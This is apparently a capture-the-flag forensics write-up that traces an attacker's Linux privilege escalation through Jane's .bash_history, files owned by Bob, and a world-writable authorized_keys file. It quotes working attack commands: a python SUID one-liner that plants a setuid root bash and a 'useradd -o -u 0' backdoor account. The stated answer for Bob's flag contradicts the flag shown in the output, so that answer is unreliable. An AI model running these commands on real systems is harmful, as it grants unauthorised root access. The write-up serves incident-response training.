## In the previous task, we identified a backdoor account that the attacker created and gained access to. However, we should take a step back and determine how the attacker got the privileges to create that account in the first place. To expand our investigation into the system's users and groups, we should also look into each user's personal directory, files, history, and configurations.
## we need to see the what directory privileges were misconfigured which attacker exploited.

### View Jane's .bash_history file. What flag do you see in the output?
Answer: THM{f38279ab9c6af1215815e5f7bbad891b}

Solution: we need to analyze the directory of Jane user and we'll find what commands has been executed and we see the history of commands from .bash_history file

investigator@ip-10-10-20-24:/home/jane$ ls -la
total 32
drwxr-xr-x 4 jane jane 4096 Feb 13 00:36 .
drwxr-xr-x 6 root root 4096 Feb 12 18:00 ..
-rw------- 1 jane jane  317 Feb 13 02:23 .bash_history
-rw-r--r-- 1 jane jane  220 Feb 12 17:07 .bash_logout
-rw-r--r-- 1 jane jane 3771 Feb 12 17:07 .bashrc
drwx------ 2 jane jane 4096 Feb 12 17:16 .cache
-rw-r--r-- 1 jane jane  807 Feb 12 17:07 .profile
drwxr-xr-x 2 jane jane 4096 Feb 12 17:15 .ssh

==> we've two suspected files here .ssh and .bash_history. Read the history files to see what commands were executed and you'll need to use the "sudo" keyword

investigator@ip-10-10-20-24:/home/jane$ sudo cat .bash_history 
whoami
groups
cd ~
ls -al
find / -perm -u=s -type f 2>/dev/null
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p", "-c", "cp /bin/bash /var/tmp/bash && chown root:root /var/tmp/bash && chmod +s /var/tmp/bash")'
ls -al /var/tmp
exit
useradd -o -u 0 b4ckd00r3d
exit
THM{f38279ab9c6af1215815e5f7bbad891b}

### What is the hidden flag in Bob's home directory?
Answer: THM{6ed90e00e4fb7945bead8cd59e9fcd7f}

Solution: All you've to do is to find the user bob and files that are concerned with him by following command.   
   investigator@ip-10-10-20-24:/home/bob$ find / -user bob -type f 2>/dev/null

   ==> I am not putting all dust here but directory where the flag is available  and let read it.

   /var/tmp/findme.txt
/var/tmp/findme.sh
investigator@ip-10-10-20-24:/home/bob$ cat /var/tmp/findme.txt 
THM{0b1313afd2136ca0faafb2daa2b430f3}

### Run the stat command on Jane's authorized_keys file. What is the full timestamp of the most recent modification?
Answer: 2024-02-13 00:34:16.005897449 +0000

Solution: As our previous command, similary run stat command to check the file authorized_keys on the jane's directory.

investigator@ip-10-10-20-24:/home/jane/.ssh$ stat authorized_keys 
  File: authorized_keys
  Size: 1136       Blocks: 8          IO Block: 4096   regular file
Device: ca01h/51713d  Inode: 257561      Links: 1
Access: (0666/-rw-rw-rw-)  Uid: ( 1002/    jane)   Gid: ( 1002/    jane)
Access: 2024-05-18 08:32:56.772000000 +0000
Modify: 2024-02-13 00:34:16.005897449 +0000
Change: 2024-02-13 00:34:16.005897449 +0000
 Birth: -




   
